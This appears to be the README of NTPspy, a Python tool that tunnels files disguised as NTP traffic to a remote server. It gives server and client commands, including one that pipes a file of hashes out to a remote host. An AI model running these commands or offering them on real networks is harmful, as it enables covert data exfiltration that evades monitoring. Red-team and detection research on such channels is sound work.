# NTPspy - data tunneling over NTP

Transfer files disguised in simulated NTP traffic.

## Usage

**Quick start:**

Choose a port, default standard NTP 123, and magic number - any 32bit hex number besides zero and start NTPspy in server mode.

Use the same port and magic number to invoke the client with a filename, list of filenames, or piped input. Use -t n to set minimum time interval between messages in seconds.

See built-in -h help for complete options.

**Server mode:**

`ntpspy.py -s <path> [-p port] [-m magic]`

`ntpspy.py -s "./incoming" -p 1230 -m 0xfefefefe`

**Client:**

`ntpspy.py [-p port] [-m magic] remote filename [filename ... ]`

`ntpspy.py -m 0xfefefefe remote:1230 *.pdf`

`cat hashes.txt | ntpspy.py -m 0xfefefefe -p 1230 remote`

Other options:

- -t Minimum interval between messages
- -q Just query server version/confirm NTPspy presence and exit

## System requirements

Python 3.7

## Known limits/issues

Don't have multiples server instances pointed at same store directory - they will overwrite each other's temporary files.
